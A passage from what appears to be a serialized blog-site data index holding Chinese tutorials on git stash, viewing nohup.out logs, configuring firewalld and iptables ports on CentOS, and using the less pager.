refs/stash@{0} (afc530377eacd4e80552d7ab1dad7234edf0145d)\n\n$ git stash list\nstash@{0}: On master: test1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n可见，test2 的 stash 是首先 pop 出来的。\n如果从 stash 中恢复的内容和当前目录中的内容发生了冲突，也就是说，恢复的内容和当前目录修改了同一行的数据，那么会提示报错，需要解决冲突，可以通过创建新的分支来解决冲突。\n\n\n# 5 git stash apply\n\n将堆栈中的内容应用到当前目录，不同于 git stash pop，该命令不会将内容从堆栈中删除，也就说该命令能够将堆栈的内容多次应用到工作目录中，适应于多个分支的情况。\n\n$ git stash apply\nOn branch master\nChanges not staged for commit:\n  (use "git add <file>..." to update what will be committed)\n  (use "git checkout -- <file>..." to discard changes in working directory)\n\n        modified:   src/main/java/com/wy/StringTest.java\n\nno changes added to commit (use "git add" and/or "git commit -a")\n\n$ git stash list\nstash@{0}: On master: test2\nstash@{1}: On master: test1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n堆栈中的内容并没有删除。\n可以使用 git stash apply + stash 名字（如 stash@{1}）指定恢复哪个 stash 到当前的工作目录。\n\n\n# 6 git stash drop + 名称\n\n从堆栈中移除某个指定的 stash\n\n\n# 7 git stash clear\n\n清除堆栈中的所有 内容\n\n\n# 8 git stash show\n\n查看堆栈中最新保存的 stash 和当前目录的差异。\n\n$ git stash show\n src/main/java/com/wy/StringTest.java | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n\n1\n2\n3\n\n\ngit stash show stash@{1} 查看指定的 stash 和当前目录差异。\n通过 git stash show -p 查看详细的不同：\n\n$ git stash show -p\ndiff --git a/src/main/java/com/wy/CacheTest.java b/src/main/java/com/wy/CacheTest.java\nindex 6e90837..de0e47b 100644\n--- a/src/main/java/com/wy/CacheTest.java\n+++ b/src/main/java/com/wy/CacheTest.java\n@@ -7,6 +7,6 @@ package com.wy;\n  */\n public class CacheTest {\n     public static void main(String[] args) {\n-        System.out.println("git stash test");\n+        System.out.println("git stash test1");\n     }\n }\ndiff --git a/src/main/java/com/wy/StringTest.java b/src/main/java/com/wy/StringTest.java\nindex a7e146c..711d63f 100644\n--- a/src/main/java/com/wy/StringTest.java\n+++ b/src/main/java/com/wy/StringTest.java\n@@ -12,7 +12,7 @@ public class StringTest {\n\n     @Test\n     public void test1() {\n-        System.out.println("=================");\n+        System.out.println("git stash test1");\n         System.out.println(Strings.isNullOrEmpty(""));//true\n         System.out.println(Strings.isNullOrEmpty(" "));//false\n         System.out.println(Strings.nullToEmpty(null));//""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n同样，通过 git stash show stash@{1} -p 查看指定的 stash 的差异内容。\n\n\n# 9 git stash branch\n\n从最新的 stash 创建分支。\n应用场景：当储藏了部分工作，暂时不去理会，继续在当前分支进行开发，后续想将 stash 中的内容恢复到当前工作目录时，如果是针对同一个文件的修改（即便不是同行数据），那么可能会发生冲突，恢复失败，这里通过创建新的分支来解决。可以用于解决 stash 中的内容和当前目录的内容发生冲突的情景。\n发生冲突时，需手动解决冲突。',normalizedContent:'> 本文原文地址 https://blog.csdn.net/stone_yw/article/details/80795669\n\n\n# 应用场景：\n\n1 当正在 dev 分支上开发某个项目，这时项目中出现一个 bug，需要紧急修复，但是正在开发的内容只是完成一半，还不想提交，这时可以用 git stash 命令将修改的内容保存至堆栈区，然后顺利切换到 hotfix 分支进行 bug 修复，修复完成后，再次切回到 dev 分支，从堆栈中恢复刚刚保存的内容。\n2 由于疏忽，本应该在 dev 分支开发的内容，却在 master 上进行了开发，需要重新切回到 dev 分支上进行开发，可以用 git stash 将内容保存至堆栈中，切回到 dev 分支后，再次恢复内容即可。\n总的来说，git stash 命令的作用就是将目前还不想提交的但是已经修改的内容进行保存至堆栈中，后续可以在某个分支上恢复出堆栈中的内容。这也就是说，stash 中的内容不仅仅可以恢复到原先开发的分支，也可以恢复到其他任意指定的分支上。git stash 作用的范围包括工作区和暂存区中的内容，也就是说没有提交的内容都会保存至堆栈中。\n\n\n# 命令详解：\n\n\n# 1 git stash\n\n能够将所有未提交的修改（工作区和暂存区）保存至堆栈中，用于后续恢复当前工作目录。\n\n$ git status\non branch master\nchanges not staged for commit:\n  (use "git add <file>..." to update what will be committed)\n  (use "git checkout -- <file>..." to discard changes in working directory)\n\n        modified:   src/main/java/com/wy/cachetest.java\n        modified:   src/main/java/com/wy/stringtest.java\n\nno changes added to commit (use "git add" and/or "git commit -a")\n\n$ git stash\nsaved working directory and index state wip on master: b2f489c second\n\n$ git status\non branch master\nnothing to commit, working tree clean\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# 2 git stash save\n\n作用等同于 git stash，区别是可以加一些注释，如下：\ngit stash 的效果：\n\nstash@{0}: wip on master: b2f489c second\n\n\n1\n\n\ngit stash save “test1” 的效果：\n\nstash@{0}: on master: test1\n\n\n1\n\n\n\n# 3 git stash list\n\n查看当前 stash 中的内容\n\n\n# 4 git stash pop\n\n将当前 stash 中的内容弹出，并应用到当前分支对应的工作目录上。\n注：该命令将堆栈中最近保存的内容删除（栈是先进后出）\n顺序执行 git stash save “test1” 和 git stash save “test2” 命令，效果如下：\n\n$ git stash list\nstash@{0}: on master: test2\nstash@{1}: on master: test1\n\n$ git stash pop\non branch master\nchanges not staged for commit:\n  (use "git add <file>..." to update what will be committed)\n  (use "git checkout -- <file>..." to discard changes in working directory)\n\n        modified:   src/main/java/com/wy/stringtest.java\n\nno changes added to commit (use "git add" and/or "git commit -a")\ndropped refs/stash@{0} (afc530377eacd4e80552d7ab1dad7234edf0145d)\n\n$ git stash list\nstash@{0}: on master: test1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n可见，test2 的 stash 是首先 pop 出来的。\n如果从 stash 中恢复的内容和当前目录中的内容发生了冲突，也就是说，恢复的内容和当前目录修改了同一行的数据，那么会提示报错，需要解决冲突，可以通过创建新的分支来解决冲突。\n\n\n# 5 git stash apply\n\n将堆栈中的内容应用到当前目录，不同于 git stash pop，该命令不会将内容从堆栈中删除，也就说该命令能够将堆栈的内容多次应用到工作目录中，适应于多个分支的情况。\n\n$ git stash apply\non branch master\nchanges not staged for commit:\n  (use "git add <file>..." to update what will be committed)\n  (use "git checkout -- <file>..." to discard changes in working directory)\n\n        modified:   src/main/java/com/wy/stringtest.java\n\nno changes added to commit (use "git add" and/or "git commit -a")\n\n$ git stash list\nstash@{0}: on master: test2\nstash@{1}: on master: test1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n堆栈中的内容并没有删除。\n可以使用 git stash apply + stash 名字（如 stash@{1}）指定恢复哪个 stash 到当前的工作目录。\n\n\n# 6 git stash drop + 名称\n\n从堆栈中移除某个指定的 stash\n\n\n# 7 git stash clear\n\n清除堆栈中的所有 内容\n\n\n# 8 git stash show\n\n查看堆栈中最新保存的 stash 和当前目录的差异。\n\n$ git stash show\n src/main/java/com/wy/stringtest.java | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n\n1\n2\n3\n\n\ngit stash show stash@{1} 查看指定的 stash 和当前目录差异。\n通过 git stash show -p 查看详细的不同：\n\n$ git stash show -p\ndiff --git a/src/main/java/com/wy/cachetest.java b/src/main/java/com/wy/cachetest.java\nindex 6e90837..de0e47b 100644\n--- a/src/main/java/com/wy/cachetest.java\n+++ b/src/main/java/com/wy/cachetest.java\n@@ -7,6 +7,6 @@ package com.wy;\n  */\n public class cachetest {\n     public static void main(string[] args) {\n-        system.out.println("git stash test");\n+        system.out.println("git stash test1");\n     }\n }\ndiff --git a/src/main/java/com/wy/stringtest.java b/src/main/java/com/wy/stringtest.java\nindex a7e146c..711d63f 100644\n--- a/src/main/java/com/wy/stringtest.java\n+++ b/src/main/java/com/wy/stringtest.java\n@@ -12,7 +12,7 @@ public class stringtest {\n\n     @test\n     public void test1() {\n-        system.out.println("=================");\n+        system.out.println("git stash test1");\n         system.out.println(strings.isnullorempty(""));//true\n         system.out.println(strings.isnullorempty(" "));//false\n         system.out.println(strings.nulltoempty(null));//""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n同样，通过 git stash show stash@{1} -p 查看指定的 stash 的差异内容。\n\n\n# 9 git stash branch\n\n从最新的 stash 创建分支。\n应用场景：当储藏了部分工作，暂时不去理会，继续在当前分支进行开发，后续想将 stash 中的内容恢复到当前工作目录时，如果是针对同一个文件的修改（即便不是同行数据），那么可能会发生冲突，恢复失败，这里通过创建新的分支来解决。可以用于解决 stash 中的内容和当前目录的内容发生冲突的情景。\n发生冲突时，需手动解决冲突。',charsets:{cjk:!0},lastUpdated:"2022/04/30, 18:54:20",lastUpdatedTimestamp:165131606e4},{title:"out 日志文件",frontmatter:{title:"out 日志文件",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/06acba/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/01.%E6%9F%A5%E7%9C%8Bnohup.out%20%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6.html",relativePath:"08.软件使用/05.linux/01.查看nohup.out 日志文件.md",key:"v-cde372d8",path:"/pages/06acba/",headers:[{level:2,title:"1.查看实时日志：",slug:"_1-查看实时日志",normalizedTitle:"1.查看实时日志：",charIndex:23},{level:2,title:"2.查看实时日志并检索关键字：",slug:"_2-查看实时日志并检索关键字",normalizedTitle:"2.查看实时日志并检索关键字：",charIndex:62},{level:2,title:"3.查看文件最后100行日志：",slug:"_3-查看文件最后100行日志",normalizedTitle:"3.查看文件最后100行日志：",charIndex:120},{level:2,title:"4.分页查看所有日志：",slug:"_4-分页查看所有日志",normalizedTitle:"4.分页查看所有日志：",charIndex:175},{level:2,title:"5.检索日志，并显示该条日志的前后N行记录：",slug:"_5-检索日志-并显示该条日志的前后n行记录",normalizedTitle:"5.检索日志，并显示该条日志的前后n行记录：",charIndex:218},{level:2,title:"6.查看日志，从第100行开始，显示500行：",slug:"_6-查看日志-从第100行开始-显示500行",normalizedTitle:"6.查看日志，从第100行开始，显示500行：",charIndex:292},{level:2,title:"7.查看日志，从第100行到200行：",slug:"_7-查看日志-从第100行到200行",normalizedTitle:"7.查看日志，从第100行到200行：",charIndex:369},{level:2,title:"8.删除包括关键词的行：",slug:"_8-删除包括关键词的行",normalizedTitle:"8.删除包括关键词的行：",charIndex:444}],headersStr:"1.查看实时日志： 2.查看实时日志并检索关键字： 3.查看文件最后100行日志： 4.分页查看所有日志： 5.检索日志，并显示该条日志的前后N行记录： 6.查看日志，从第100行开始，显示500行： 7.查看日志，从第100行到200行： 8.删除包括关键词的行：",content:'# 查看nohup.out 日志文件\n\n\n# 1.查看实时日志：\n\ntail -f nohup.out \n\n\n1\n\n\n\n# 2.查看实时日志并检索关键字：\n\ntail -f nohup.out | grep "关键字" \n\n\n1\n\n\n\n# 3.查看文件最后100行日志：\n\ntail -n 100 nohup.out | more\n\n\n1\n\n\n\n# 4.分页查看所有日志：\n\ncat nohup.out | more\n\n\n1\n\n\n\n# 5.检索日志，并显示该条日志的前后N行记录：\n\ncat nohup.out | grep -n -B10 -A10 "关键字" \n\n\n1\n\n\n\n# 6.查看日志，从第100行开始，显示500行：\n\ncat nohup.out | tail -n +100| head -n 500 \n\n\n1\n\n\n\n# 7.查看日志，从第100行到200行：\n\ncat nohup.out | head -n 1500| tail -n +1000 \n\n\n1\n\n\n\n# 8.删除包括关键词的行：\n\nsed -i \'/关键词/d\' nohup.out\n\n\n1\n',normalizedContent:'# 查看nohup.out 日志文件\n\n\n# 1.查看实时日志：\n\ntail -f nohup.out \n\n\n1\n\n\n\n# 2.查看实时日志并检索关键字：\n\ntail -f nohup.out | grep "关键字" \n\n\n1\n\n\n\n# 3.查看文件最后100行日志：\n\ntail -n 100 nohup.out | more\n\n\n1\n\n\n\n# 4.分页查看所有日志：\n\ncat nohup.out | more\n\n\n1\n\n\n\n# 5.检索日志，并显示该条日志的前后n行记录：\n\ncat nohup.out | grep -n -b10 -a10 "关键字" \n\n\n1\n\n\n\n# 6.查看日志，从第100行开始，显示500行：\n\ncat nohup.out | tail -n +100| head -n 500 \n\n\n1\n\n\n\n# 7.查看日志，从第100行到200行：\n\ncat nohup.out | head -n 1500| tail -n +1000 \n\n\n1\n\n\n\n# 8.删除包括关键词的行：\n\nsed -i \'/关键词/d\' nohup.out\n\n\n1\n',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"CentOS7使用firewall-cmd打开关闭防火墙与端口 以开放8080端口为例",frontmatter:{title:"CentOS7使用firewall-cmd打开关闭防火墙与端口 以开放8080端口为例",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/d3d28c/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/02.CentOS7%E4%BD%BF%E7%94%A8firewall-cmd%E6%89%93%E5%BC%80%E5%85%B3%E9%97%AD%E9%98%B2%E7%81%AB%E5%A2%99%E4%B8%8E%E7%AB%AF%E5%8F%A3%20%E4%BB%A5%E5%BC%80%E6%94%BE8080%E7%AB%AF%E5%8F%A3%E4%B8%BA%E4%BE%8B.html",relativePath:"08.软件使用/05.linux/02.CentOS7使用firewall-cmd打开关闭防火墙与端口 以开放8080端口为例.md",key:"v-6d45f4ae",path:"/pages/d3d28c/",headersStr:null,content:'centos7版本对防火墙进行加强,不再使用原来的iptables,启用firewalld\n\n\n# 简单上手（以配置8080端口为例）\n\n 1. 输入命令查看防火墙的状态\n    \n    firewall-cmd --state;\n    \n    \n    1\n    \n\n 2. 如果没有开启，输入命令\n    \n    systemctl start firewalld.service;\n    \n    \n    1\n    \n\n 3. 开启8080端口，输入：\n    \n    firewall-cmd --zone=public --add-port=8080/tcp --permanent;\n    \n    \n    1\n    \n    * zone=public：表示作用域为公共的；\n    * add-port=8080/tcp：添加tcp协议的端口8080；\n    * permanent：永久生效，如果没有此参数，则只能维持当前服务生命周期内，重新启动后失效；\n\n 4. 输入命令重启防火墙\n    \n    systemctl restart firewalld.service;\n    \n    \n    1\n    \n\n 5. 输入命令重新载入配置\n    \n    firewall-cmd --reload; \n    \n    \n    1\n    \n\n\n# firewall相关命令介绍\n\n 1. firewalld的基本使用\n    \n    启动：  systemctl start firewalld\n    查状态：systemctl status firewalld \n    停止：  systemctl disable firewalld\n    禁用：  systemctl stop firewalld\n    在开机时启用一个服务：systemctl enable firewalld.service\n    在开机时禁用一个服务：systemctl disable firewalld.service\n    查看服务是否开机启动：systemctl is-enabled firewalld.service\n    查看已启动的服务列表：systemctl list-unit-files|grep enabled\n    查看启动失败的服务列表：systemctl --failed\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 2. 配置firewalld-cmd\n    \n    查看版本： firewall-cmd --version\n    查看帮助： firewall-cmd --help\n    显示状态： firewall-cmd --state\n    查看所有打开的端口： firewall-cmd --zone=public --list-ports\n    更新防火墙规则： firewall-cmd --reload\n    查看区域信息:  firewall-cmd --get-active-zones\n    查看指定接口所属区域： firewall-cmd --get-zone-of-interface=eth0\n    拒绝所有包：firewall-cmd --panic-on\n    取消拒绝状态： firewall-cmd --panic-off\n    查看是否拒绝： firewall-cmd --query-panic\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 3. 那怎么开启一个端口呢\n    \n    添加\n    firewall-cmd --zone=public(作用域) --add-port=80/tcp(端口和访问类型) --permanent(永久生效)\n    firewall-cmd --zone=public --add-service=http --permanent\n    firewall-cmd --reload    # 重新载入，更新防火墙规则\n    firewall-cmd --zone= public --query-port=80/tcp  #查看\n    firewall-cmd --zone= public --remove-port=80/tcp --permanent  # 删除\n    \n    firewall-cmd --list-services\n    firewall-cmd --get-services\n    firewall-cmd --add-service=<service>\n    firewall-cmd --delete-service=<service>\n    在每次修改端口和服务后/etc/firewalld/zones/public.xml文件就会被修改,所以也可以在文件中之间修改,然后重新加载\n    使用命令实际也是在修改文件，需要重新加载才能生效。\n    \n    firewall-cmd --zone=public --query-port=80/tcp\n    firewall-cmd --zone=public --query-port=8080/tcp\n    firewall-cmd --zone=public --query-port=3306/tcp\n    firewall-cmd --zone=public --add-port=8080/tcp --permanent\n    firewall-cmd --zone=public --add-port=3306/tcp --permanent\n    firewall-cmd --zone=public --query-port=3306/tcp\n    firewall-cmd --zone=public --query-port=8080/tcp\n    firewall-cmd --reload  # 重新加载后才能生效\n    firewall-cmd --zone=public --query-port=3306/tcp\n    firewall-cmd --zone=public --query-port=8080/tcp\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    \n    \n    4.参数解释\n    \n    –add-service #添加的服务\n    –zone #作用域\n    –add-port=80/tcp #添加端口，格式为：端口/通讯协议\n    –permanent #永久生效，没有此参数重启后失效\n    \n    \n    1\n    2\n    3\n    4\n    \n    \n    5.详细使用\n    \n    firewall-cmd --permanent --zone=public --add-rich-rule=\'rule family="ipv4" source address="192.168.0.4/24" service name="http" accept\'    //设置某个ip访问某个服务\n    firewall-cmd --permanent --zone=public --remove-rich-rule=\'rule family="ipv4" source address="192.168.0.4/24" service name="http" accept\' //删除配置\n    firewall-cmd --permanent --add-rich-rule \'rule family=ipv4 source address=192.168.0.1/2 port port=80 protocol=tcp accept\'     //设置某个ip访问某个端口\n    firewall-cmd --permanent --remove-rich-rule \'rule family=ipv4 source address=192.168.0.1/2 port port=80 protocol=tcp accept\'     //删除配置\n    \n    firewall-cmd --query-masquerade  # 检查是否允许伪装IP\n    firewall-cmd --add-masquerade    # 允许防火墙伪装IP\n    firewall-cmd --remove-masquerade # 禁止防火墙伪装IP\n    \n    firewall-cmd --add-forward-port=port=80:proto=tcp:toport=8080   # 将80端口的流量转发至8080\n    firewall-cmd --add-forward-port=proto=80:proto=tcp:toaddr=192.168.1.0.1 # 将80端口的流量转发至192.168.0.1\n    firewall-cmd --add-forward-port=proto=80:proto=tcp:toaddr=192.168.0.1:toport=8080 # 将80端口的流量转发至192.168.0.1的8080端口\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n\n# centos7以下版本\n\n 1. 开放80，22，8080 端口\n    \n    /sbin/iptables -I INPUT -p tcp --dport 80 -j ACCEPT\n    /sbin/iptables -I INPUT -p tcp --dport 22 -j ACCEPT\n    /sbin/iptables -I INPUT -p tcp --dport 8080 -j ACCEPT\n    \n    \n    1\n    2\n    3\n    \n 2. 保存\n    \n    /etc/rc.d/init.d/iptables save\n    \n    \n    1\n    \n 3. 查看打开的端口\n    \n    /etc/init.d/iptables status\n    \n    \n    1\n    \n 4. 关闭防火墙 1） 永久性生效，重启后不会复原 开启： chkconfig iptables on 关闭： chkconfig iptables off 2） 即时生效，重启后复原 开启： service iptables start 关闭： service iptables stop',normalizedContent:'centos7版本对防火墙进行加强,不再使用原来的iptables,启用firewalld\n\n\n# 简单上手（以配置8080端口为例）\n\n 1. 输入命令查看防火墙的状态\n    \n    firewall-cmd --state;\n    \n    \n    1\n    \n\n 2. 如果没有开启，输入命令\n    \n    systemctl start firewalld.service;\n    \n    \n    1\n    \n\n 3. 开启8080端口，输入：\n    \n    firewall-cmd --zone=public --add-port=8080/tcp --permanent;\n    \n    \n    1\n    \n    * zone=public：表示作用域为公共的；\n    * add-port=8080/tcp：添加tcp协议的端口8080；\n    * permanent：永久生效，如果没有此参数，则只能维持当前服务生命周期内，重新启动后失效；\n\n 4. 输入命令重启防火墙\n    \n    systemctl restart firewalld.service;\n    \n    \n    1\n    \n\n 5. 输入命令重新载入配置\n    \n    firewall-cmd --reload; \n    \n    \n    1\n    \n\n\n# firewall相关命令介绍\n\n 1. firewalld的基本使用\n    \n    启动：  systemctl start firewalld\n    查状态：systemctl status firewalld \n    停止：  systemctl disable firewalld\n    禁用：  systemctl stop firewalld\n    在开机时启用一个服务：systemctl enable firewalld.service\n    在开机时禁用一个服务：systemctl disable firewalld.service\n    查看服务是否开机启动：systemctl is-enabled firewalld.service\n    查看已启动的服务列表：systemctl list-unit-files|grep enabled\n    查看启动失败的服务列表：systemctl --failed\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 2. 配置firewalld-cmd\n    \n    查看版本： firewall-cmd --version\n    查看帮助： firewall-cmd --help\n    显示状态： firewall-cmd --state\n    查看所有打开的端口： firewall-cmd --zone=public --list-ports\n    更新防火墙规则： firewall-cmd --reload\n    查看区域信息:  firewall-cmd --get-active-zones\n    查看指定接口所属区域： firewall-cmd --get-zone-of-interface=eth0\n    拒绝所有包：firewall-cmd --panic-on\n    取消拒绝状态： firewall-cmd --panic-off\n    查看是否拒绝： firewall-cmd --query-panic\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 3. 那怎么开启一个端口呢\n    \n    添加\n    firewall-cmd --zone=public(作用域) --add-port=80/tcp(端口和访问类型) --permanent(永久生效)\n    firewall-cmd --zone=public --add-service=http --permanent\n    firewall-cmd --reload    # 重新载入，更新防火墙规则\n    firewall-cmd --zone= public --query-port=80/tcp  #查看\n    firewall-cmd --zone= public --remove-port=80/tcp --permanent  # 删除\n    \n    firewall-cmd --list-services\n    firewall-cmd --get-services\n    firewall-cmd --add-service=<service>\n    firewall-cmd --delete-service=<service>\n    在每次修改端口和服务后/etc/firewalld/zones/public.xml文件就会被修改,所以也可以在文件中之间修改,然后重新加载\n    使用命令实际也是在修改文件，需要重新加载才能生效。\n    \n    firewall-cmd --zone=public --query-port=80/tcp\n    firewall-cmd --zone=public --query-port=8080/tcp\n    firewall-cmd --zone=public --query-port=3306/tcp\n    firewall-cmd --zone=public --add-port=8080/tcp --permanent\n    firewall-cmd --zone=public --add-port=3306/tcp --permanent\n    firewall-cmd --zone=public --query-port=3306/tcp\n    firewall-cmd --zone=public --query-port=8080/tcp\n    firewall-cmd --reload  # 重新加载后才能生效\n    firewall-cmd --zone=public --query-port=3306/tcp\n    firewall-cmd --zone=public --query-port=8080/tcp\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    \n    \n    4.参数解释\n    \n    –add-service #添加的服务\n    –zone #作用域\n    –add-port=80/tcp #添加端口，格式为：端口/通讯协议\n    –permanent #永久生效，没有此参数重启后失效\n    \n    \n    1\n    2\n    3\n    4\n    \n    \n    5.详细使用\n    \n    firewall-cmd --permanent --zone=public --add-rich-rule=\'rule family="ipv4" source address="192.168.0.4/24" service name="http" accept\'    //设置某个ip访问某个服务\n    firewall-cmd --permanent --zone=public --remove-rich-rule=\'rule family="ipv4" source address="192.168.0.4/24" service name="http" accept\' //删除配置\n    firewall-cmd --permanent --add-rich-rule \'rule family=ipv4 source address=192.168.0.1/2 port port=80 protocol=tcp accept\'     //设置某个ip访问某个端口\n    firewall-cmd --permanent --remove-rich-rule \'rule family=ipv4 source address=192.168.0.1/2 port port=80 protocol=tcp accept\'     //删除配置\n    \n    firewall-cmd --query-masquerade  # 检查是否允许伪装ip\n    firewall-cmd --add-masquerade    # 允许防火墙伪装ip\n    firewall-cmd --remove-masquerade # 禁止防火墙伪装ip\n    \n    firewall-cmd --add-forward-port=port=80:proto=tcp:toport=8080   # 将80端口的流量转发至8080\n    firewall-cmd --add-forward-port=proto=80:proto=tcp:toaddr=192.168.1.0.1 # 将80端口的流量转发至192.168.0.1\n    firewall-cmd --add-forward-port=proto=80:proto=tcp:toaddr=192.168.0.1:toport=8080 # 将80端口的流量转发至192.168.0.1的8080端口\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n\n# centos7以下版本\n\n 1. 开放80，22，8080 端口\n    \n    /sbin/iptables -i input -p tcp --dport 80 -j accept\n    /sbin/iptables -i input -p tcp --dport 22 -j accept\n    /sbin/iptables -i input -p tcp --dport 8080 -j accept\n    \n    \n    1\n    2\n    3\n    \n 2. 保存\n    \n    /etc/rc.d/init.d/iptables save\n    \n    \n    1\n    \n 3. 查看打开的端口\n    \n    /etc/init.d/iptables status\n    \n    \n    1\n    \n 4. 关闭防火墙 1） 永久性生效，重启后不会复原 开启： chkconfig iptables on 关闭： chkconfig iptables off 2） 即时生效，重启后复原 开启： service iptables start 关闭： service iptables stop',charsets:{cjk:!0},lastUpdated:"2022/04/21, 16:04:14",lastUpdatedTimestamp:1650528254e3},{title:"Linux 操作命令 less",frontmatter:{title:"Linux 操作命令 less",date:"2022-04-18T00:00:13.000Z",permalink:"/pages/517024/",categories:["软件使用","linux"],tags:[null],author:{name:"kehao",link:"https://github.com/chenkehao1998"}},regularPath:"/08.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8/05.linux/03.Linux%20%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4%20less.html",relativePath:"08.软件使用/05.linux/03.Linux 操作命令 less.md",key:"v-3044f191",path:"/pages/517024/",headers:[{level:2,title:"4.1 基本用法",slug:"_4-1-基本用法",normalizedTitle:"4.1 基本用法",charIndex:179},{level:2,title:"4.2 基本操作",slug:"_4-2-基本操作",normalizedTitle:"4.2 基本操作",charIndex:247},{level:2,title:"5.1 浏览自动关闭",slug:"_5-1-浏览自动关闭",normalizedTitle:"5.1 浏览自动关闭",charIndex:597},{level:2,title:"5.2 强制 打开",slug:"_5-2-强制-打开",normalizedTitle:"5.2 强制 打开",charIndex:670},{level:2,title:"5.3 忽略大小写",slug:"_5-3-忽略大小写",normalizedTitle:"5.3 忽略大小写",charIndex:755},{level:2,title:"5.4 百分比显示",slug:"_5-4-百分比显示",normalizedTitle:"5.4 百分比显示",charIndex:823},{level:2,title:"5.5 行显示",slug:"_5-5-行显示",normalizedTitle:"5.5 行显示",charIndex:895},{level:3,title:"5.5.1 显示 行号",slug:"_5-5-1-显示-行号",normalizedTitle:"5.5.1 显示 行号",charIndex:907},{level:3,title:"5.5.2 连续空行 处理 – 只显示一个空行",slug:"_5-5-2-连续空行-处理-只显示一个空行",normalizedTitle:"5.5.2 连续空行 处理 – 只显示一个空行",charIndex:981}],headersStr:"4.1 基本用法 4.2 基本操作 5.1 浏览自动关闭 5.2 强制 打开 5.3 忽略大小写 5.4 百分比显示 5.5 行显示 5.5.1 显示 行号 5.5.2 连续空行 处理 – 只显示一个空行",content:"> 参考视频：https://www.bilibili.com/video/BV1qy4y1L7Nt\n\n\n# 1. 简介\n\nlinux 正统查看文件内容的工具，功能极其强大\n\n\n# 2. 主要功能\n\nless 工具也是对文件或其它输出进行分页显示的工具\n\n\n# 3. 用法/命令格式\n\nless [选项] 文件\n\n\n1\n\n\n\n# 4. 常用参数解析\n\n\n# 4.1 基本用法\n\n语法          参数   说明\nless {文件}        将文件的内容从上到下显示在屏幕上\n\n\n# 4.2 基本操作\n\n按键             说明\n/字符串           向下搜索“字符串”的功能\n?字符串           向上搜索“字符串”的功能\nn              重复前一个搜索（与 / 或 ? 有关）\nN              反向重复前一个搜索（与 / 或 ? 有关）\nb              向前翻一页\nd              向后翻半页\nq              退出 less 命令\n空格键            向后翻一页\n向上键            向上翻动一行\n向下键            向下翻动一行\ng              移动到第一行\nG（或者Shfit+g）   移动到最后一行\n\n\n# 5. 辅助功能\n\n\n# 5.1 浏览自动关闭\n\n语法             参数   说明\nless -e {文件}   -e   当文件显示结束后，自动离开\n\n\n# 5.2 强制 打开\n\n语法             参数   说明\nless -f {文件}   -f   强迫打开特殊文件，例如外围设备代号、目录和二进制文件\n\n\n# 5.3 忽略大小写\n\n语法             参数   说明\nless -i {文件}   -i   忽略搜索时的大小写\n\n\n# 5.4 百分比显示\n\n语法             参数   说明\nless -m {文件}   -m   显示 当前 内容百分比进度\n\n\n# 5.5 行显示\n\n\n# 5.5.1 显示 行号\n\n语法             参数   说明\nless -N {文件}   -N   显示每行的行号（包括空行）\n\n\n# 5.5.2 连续空行 处理 – 只显示一个空行\n\n语法             参数   说明\nless -s {文件}   -s   多个空行 只显示 一行\n\n\n# 6. less 与 cat 和 more 的区别\n\ncat 命令     显示整个文件的内容     单独使用没有翻页功能 – 可以通过 管道 与 more 组合使用     cat 命令还可以将数个文件合并成一个文件的功能（重定向）\n\nmore 命令功能     让画面在显示满一页时暂停     按键操作 显示画面\n\nless 命令功能     less 命令的用法与 more 命令类似，也可以用来浏览超过一页的文件     less 命令除了可以按空格键向下显示文件外，还可以利用上下键来操作显示",normalizedContent:"> 参考视频：https://www.bilibili.com/video/bv1qy4y1l7nt\n\n\n# 1. 简介\n\nlinux 正统查看文件内容的工具，功能极其强大\n\n\n# 2. 主要功能\n\nless 工具也是对文件或其它输出进行分页显示的工具\n\n\n# 3. 用法/命令格式\n\nless [选项] 文件\n\n\n1\n\n\n\n# 4. 常用参数解析\n\n\n# 4.1 基本用法\n\n语法          参数   说明\nless {文件}        将文件的内容从上到下显示在屏幕上\n\n\n# 